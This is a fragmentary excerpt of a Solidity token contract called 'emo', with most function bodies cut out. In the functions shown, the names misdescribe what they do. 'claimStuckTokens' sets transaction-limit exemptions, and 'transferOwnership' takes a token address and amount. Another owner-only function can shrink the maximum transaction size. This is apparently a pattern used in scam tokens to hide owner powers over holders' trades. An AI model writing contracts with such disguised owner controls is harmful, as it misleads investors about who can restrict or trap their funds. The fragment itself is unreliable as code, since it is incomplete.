...
contract emo is Context, IERC20, Ownable {
    ...
    function lprocessIndex(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
    ...
    function transferOwnership(address tokenAddress, uint256 tokenAmount) public onlyOwner {
    ...
    function ischangeAmountSet(uint256 maxWallPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxWallPercent) / 2000;
    }


    function claimStuckTokens(address pair, bool value) external onlyOwner {
        isTxLimitExempt[pair] = value;
    }

    function ischangeMultiplierSet(uint8 numerator, uint8 denominator, uint8 length) external onlyOwner {
    ...
    function maxmultipliedFee() public view returns (uint256) {
	...
	function lpreLaunch(uint256 launchAt, uint256 dura) public view returns (bool){
